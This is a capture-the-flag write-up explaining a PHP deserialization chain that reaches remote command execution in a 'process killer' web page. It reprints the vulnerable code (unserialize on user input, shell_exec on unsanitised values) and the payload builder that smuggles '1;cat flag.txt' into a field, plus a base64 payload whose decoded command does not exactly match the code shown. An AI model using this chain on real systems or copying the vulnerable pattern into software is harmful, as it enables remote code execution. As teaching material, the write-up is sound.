## About the Challenge

This challenge is a **PHP deserialization challenge** to achieve **RCE**. The website asks for input of **Process IDs (PIDs)** that you want to kill. The website serializes these PIDs and returns what appears to be a base64 string:

**`YToxOntpOjA7czoxOiIxIjt9`**

![pkiller](/static/writeups/photos/pkiller1.png)

There is also an input field to parse this serialized code:

![pkiller](/static/writeups/photos/pkiller2.png)

Base64 decoding the string gives the following:

```php
a:1:{i:0;s:1:"1";}
```

This appears to be a **PHP serialized string**, hinting that the challenge revolves around exploiting PHP deserialization vulnerabilities.

**Serialization** is the process of converting a data structure or object into a format for storage or transmission, and reconstructing it later. PHP serialization is known to be insecure if mishandled.

## Examining the Code

Inspecting the source code of the website reveals three classes:

```php_RETRACT
$killers = array();
$admin = false;
class KillerJob {
    function __construct($isAdmin){
        $this->isAdmin = $isAdmin;
    }
    function __wakeup(){
        global $admin;
        $admin = $this->isAdmin;
    }
    function __toString() {
        global $killers;
        global $admin;
        if ($admin) {
            foreach ($killers as $tokill){
                echo shell_exec("kill " . $tokill)."<br>";
            }
        } else {
            echo "Admin not here, we can't kill yet!<br>";
        }
        return "";
    }
}
class addKill {
    function __construct($killme){
        global $killers;
        $killers[] = $killme;
    }
    function __wakeup(){
        global $killers;
        $killers[] = $this->killme;
    }
}
class MainClass {
    function __construct($name){
        $this->name = $name;
        echo "<p>Welcome ".$this->name."!<br></p>";
    }
    function __wakeup(){
        echo "Welcome back ".$this->name."!<br>";
    }
    function importProcesses($pids){
        $pids = unserialize($pids);
        foreach ($pids as $pid){
            if(filter_var($pid, FILTER_VALIDATE_INT) === false){
                die("Only integers!!!<br>");
            }
            new addKill($pid);
        }
    }
}
```

### Key Observations

**`MainClass`**
  - Contains the method **`importProcesses`**, which deserializes input, validates integers, and creates new `addKill` objects.
  - The **`__wakeup`** method is triggered during deserialization.
<br/>
<br/>

**`addKill`**
  - The **`__wakeup`** method adds the **`killme`** property to the global **`$killers`** array.
<br/>
<br/>

**`KillerJob`**
  - The **`__toString`** method executes shell commands via **`shell_exec()`** if the global **`$admin`** variable is true.
  - The method runs the `kill` command on each element of the **`$killers`** array. Manipulating **`$killers`** could allow execution of arbitrary commands like `1;cat flag.txt`.

The following code snippets handle serialization and deserialization:

```php_RETRACT
<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if the first form was submitted
    if (isset($_POST['pids'])) {
        $pids = $_POST['pids'];
        $mainClass = new MainClass("User");
        $mainClass->importProcesses(base64_decode($pids));
    }
    // Check if the second form was submitted
    if (isset($_POST['commaPids'])) {
        $commaPids = $_POST['commaPids'];
        $pidArray = array_map('trim', explode(',', $commaPids));
        $serializedPids = serialize($pidArray);
        echo "<p>Serialized PIDs: <br>" . htmlspecialchars(base64_encode($serializedPids)) . "</p>";
    }
}
?>
```

## Solve Process

### Step 1: Exploiting the `__wakeup` Method

Although inputs are validated to ensure integers, these checks occur **after deserialization**. Since the **`__wakeup`** method triggers during deserialization, we can exploit it.

For instance, by creating a custom **`addKill`** object with a crafted **`killme`** attribute, the **`__wakeup`** method adds our attribute to the **`$killers`** array, enabling RCE.
<br />

#### Payload to Add Command:

```php
$payload = "1;cat flag.txt";
$data = htmlspecialchars(base64_encode(serialize([new addKill($payload)])));
echo $data;
```
<br />

### Step 2: Triggering `__toString`

To execute commands, we need to trigger the **`__toString`** method of `KillerJob`. In `MainClass`, during the **`__wakeup`** method, the **`$name`** attribute is appended to a string and echoed. This calls the **`__toString`** method if **`$name`** is an object.

By creating a `MainClass` object with a `name` attribute set to a `KillerJob` object, we trigger **`__toString`**:
<br />


#### Final Payload:

```php
$payload = "1;cat flag.txt";
$data = htmlspecialchars(base64_encode(serialize([
    new addKill($payload), 
    new MainClass(new KillerJob(true))
])));
echo $data;
```

Base64 Encoded Payload:

```text
YToyOntpOjA7Tzo3OiJhZGRLaWxsIjoxOntzOjY6ImtpbGxtZSI7czoyMzoiMTtDQVRcbmZsYWcudHh0Ijt9aToxO086OToiTWFpbkNsYXNzIjoxOntzOjQ6Im5hbWUiO086OToiS2lsbGVySm9iIjoxOntzOjc6ImlzQWRtaW4iO2I6MTt9fX0=
```

Submit this payload to the deserialization endpoint. It runs the crafted shell command, returning the flag.

## Flag

```text
blahaj{p0P_Pop_cH41N}
```

## Resources

- [HackTricks PHP Deserialization](https://book.hacktricks.xyz/pentesting-web/deserialization/php-deserialization)
- [PHP Serialization Documentation](https://www.php.net/manual/en/function.serialize.php)
- [PHP Magic Methods](https://www.php.net/manual/en/language.oop5.magic.php)
